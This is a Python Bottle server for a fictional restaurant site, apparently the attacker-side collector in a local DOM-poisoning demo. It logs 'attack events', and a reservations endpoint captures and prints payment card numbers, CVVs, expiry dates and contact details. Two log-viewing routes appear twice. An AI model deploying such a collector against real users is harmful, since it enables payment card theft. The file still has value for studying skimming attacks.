#!/usr/bin/env python3
"""
Simple Bottle server for Tom's Gourmet Bistro with attack logging
"""

from bottle import route, run, static_file, request, response, post, hook
import json
import os
from datetime import datetime

# Add CORS headers for all responses
@hook('after_request')
def enable_cors():
    response.headers['Access-Control-Allow-Origin'] = '*'
    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS'
    response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization'

# Store for logging attack data
attack_log = []

@route('/')
def index():
    return static_file('index.html', root='.')

@route('/attack-log')
def view_log():
    """Simple endpoint to view logged attacks"""
    response.content_type = 'application/json'
    return json.dumps(attack_log, indent=2)

@route('/log')
def view_log_html():
    """HTML interface to view logged attacks"""
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Attack Log Viewer</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
            .container { background: white; padding: 20px; border-radius: 8px; max-width: 1200px; }
            .log-entry { border: 1px solid #ddd; margin: 10px 0; padding: 15px; border-radius: 4px; background: #fafafa; }
            .timestamp { color: #666; font-size: 0.9em; }
            .event-type { background: #e74c3c; color: white; padding: 2px 6px; border-radius: 3px; font-size: 0.8em; }
            .data { background: #2c3e50; color: white; padding: 10px; border-radius: 4px; font-family: monospace; margin-top: 10px; overflow-x: auto; }
            .refresh { background: #3498db; color: white; padding: 10px 20px; border: none; border-radius: 4px; margin-bottom: 20px; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🎯 Attack Log Viewer</h1>
            <button class="refresh" onclick="location.reload()">🔄 Refresh</button>
            <p><strong>Total entries:</strong> """ + str(len(attack_log)) + """</p>

    """

    if not attack_log:
        html += "<p>No attack data logged yet. Start the attack to see data here.</p>"

    for i, entry in enumerate(attack_log):
        html += f"""
            <div class="log-entry">
                <div class="timestamp">Entry #{i+1} - {entry.get('server_timestamp', 'Unknown time')}</div>
                <div class="event-type">{entry.get('client_data', {}).get('eventType', entry.get('type', 'unknown'))}</div>
                <div class="data">{json.dumps(entry, indent=2)}</div>
            </div>
        """

    html += """
            </div>
        </body>
        </html>
    """
    return html

@route('/<filepath:path>')
def static(filepath):
    print(f"📁 Request for: {filepath}")
    try:
        return static_file(filepath, root='.')
    except Exception as e:
        print(f"❌ Error serving {filepath}: {e}")
        response.status = 404
        return f"File not found: {filepath}"

@post('/api/attack-log')
def log_attack():
    """Simple endpoint to log DOM poisoning attacks"""
    try:
        data = request.json

        # Add server timestamp
        log_entry = {
            'server_timestamp': datetime.now().isoformat(),
            'client_data': data
        }

        attack_log.append(log_entry)

        # Print to console for immediate visibility
        print(f"\n🎯 ATTACK EVENT LOGGED: {data.get('eventType', 'unknown')}")
        print(f"   Timestamp: {log_entry['server_timestamp']}")
        print(f"   Data: {json.dumps(data, indent=2)}")

        return {'status': 'logged', 'entries': len(attack_log)}

    except Exception as e:
        print(f"Logging error: {e}")
        return {'status': 'error', 'message': str(e)}

@post('/api/reservations/submit')
def log_form_data():
    """Log form submissions (existing endpoint from newsletter.js)"""
    try:
        data = request.json

        log_entry = {
            'server_timestamp': datetime.now().isoformat(),
            'form_data': data,
            'type': 'form_submission'
        }

        attack_log.append(log_entry)

        # Extract sensitive data for logging
        if data.get('paymentInfo'):
            card_info = data['paymentInfo']
            print(f"\n💳 PAYMENT INFO CAPTURED:")
            print(f"   Card Number: {card_info.get('cardNumber', 'N/A')}")
            print(f"   Expiry: {card_info.get('cardExpiry', 'N/A')}")
            print(f"   CVV: {card_info.get('cardCVV', 'N/A')}")
            print(f"   Name: {card_info.get('cardName', 'N/A')}")

        print(f"\n📝 FORM DATA CAPTURED:")
        print(f"   Name: {data.get('firstName', '')} {data.get('lastName', '')}")
        print(f"   Email: {data.get('email', 'N/A')}")
        print(f"   Phone: {data.get('phone', 'N/A')}")

        return {'status': 'success', 'message': 'Data logged'}

    except Exception as e:
        print(f"Form logging error: {e}")
        return {'status': 'error', 'message': str(e)}

@route('/attack-log')
def view_log():
    """Simple endpoint to view logged attacks"""
    response.content_type = 'application/json'
    return json.dumps(attack_log, indent=2)

@route('/log')
def view_log_html():
    """HTML interface to view logged attacks"""
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Attack Log Viewer</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
            .container { background: white; padding: 20px; border-radius: 8px; max-width: 1200px; }
            .log-entry { border: 1px solid #ddd; margin: 10px 0; padding: 15px; border-radius: 4px; background: #fafafa; }
            .timestamp { color: #666; font-size: 0.9em; }
            .event-type { background: #e74c3c; color: white; padding: 2px 6px; border-radius: 3px; font-size: 0.8em; }
            .data { background: #2c3e50; color: white; padding: 10px; border-radius: 4px; font-family: monospace; margin-top: 10px; overflow-x: auto; }
            .refresh { background: #3498db; color: white; padding: 10px 20px; border: none; border-radius: 4px; margin-bottom: 20px; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🎯 Attack Log Viewer</h1>
            <button class="refresh" onclick="location.reload()">🔄 Refresh</button>
            <p><strong>Total entries:</strong> """ + str(len(attack_log)) + """</p>

    """

    if not attack_log:
        html += "<p>No attack data logged yet. Start the attack to see data here.</p>"

    for i, entry in enumerate(attack_log):
        html += f"""
            <div class="log-entry">
                <div class="timestamp">Entry #{i+1} - {entry.get('server_timestamp', 'Unknown time')}</div>
                <div class="event-type">{entry.get('client_data', {}).get('eventType', entry.get('type', 'unknown'))}</div>
                <div class="data">{json.dumps(entry, indent=2)}</div>
            </div>
        """

    html += """
            </div>
        </body>
        </html>
    """
    return html

if __name__ == '__main__':
    print("🚀 Starting Tom's Gourmet Bistro server with attack logging...")
    print("📊 Server running on http://localhost:9002")
    print("🎯 Attack log available at http://localhost:9002/attack-log")

    run(host='localhost', port=9002, debug=True, reloader=False)